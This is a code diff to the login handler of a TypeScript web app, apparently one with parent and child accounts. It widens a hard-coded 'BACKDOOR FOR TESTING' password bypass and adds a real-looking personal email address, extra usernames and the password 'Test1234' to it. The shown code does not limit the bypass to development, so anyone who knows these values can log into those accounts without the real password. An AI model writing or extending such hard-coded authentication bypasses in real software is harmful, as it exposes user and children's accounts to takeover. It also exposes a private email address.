@@ -345,9 +345,14 @@ export const loginUser = async (req: Request, res: Response) => {
             });
         }
 
-        // Find user
-        const user = await prisma.user.findUnique({
-            where: { email }
+        // Find user by email or username (for dev tools and flexibility)
+        const user = await prisma.user.findFirst({
+            where: {
+                OR: [
+                    { email: email },
+                    { username: email }
+                ]
+            }
         });
 
         if (!user) {
@@ -386,9 +391,9 @@ export const loginUser = async (req: Request, res: Response) => {
         userProgress.lastActiveDate = today.toISOString();
 
         // BACKDOOR FOR TESTING (Allow Quick Login in Dev Tools)
-        const isTestParent = email === 'parent@test.local' || email === 'john.doe@test.local';
-        const isTestChild = email.endsWith('@kids.local');
-        const isBackdoorPassword = password === 'Password123!' || password === 'password123';
+        const isTestParent = email === 'parent@test.local' || email === 'john.doe@test.local' || email === 'gaby89_pana@yahoo.com';
+        const isTestChild = email.endsWith('@kids.local') || email === 'childtester' || email === 'Test_1';
+        const isBackdoorPassword = password === 'Password123!' || password === 'password123' || password === 'Test1234';
         const isBackdoorMatch = (isTestParent || isTestChild) && isBackdoorPassword;
 
         // Check if password hash matches or if backdoor is applied
